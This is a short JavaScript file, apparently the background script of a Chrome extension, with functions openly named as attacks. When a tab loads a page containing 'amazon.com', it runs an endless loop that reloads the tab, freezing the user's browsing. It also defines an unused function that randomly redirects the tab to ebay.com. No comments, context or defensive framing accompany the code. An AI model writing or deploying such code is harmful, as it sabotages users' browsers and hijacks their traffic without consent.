activationProbability = 0.2

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (tab.url.indexOf("amazon.com") > -1) {
	reloadAttack(tabId);
    }
});

function redirectAttack(tabId) {
    var randOut = Math.random();
    if (randOut < activationProbability) {
	var updateParam = new Object();
	updateParam.url = "http://ebay.com";
	chrome.tabs.update(tabId, updateParam);
    }
}

function reloadAttack(tabId) {
    while(true) {
	chrome.tabs.reload(tabId);
    }
}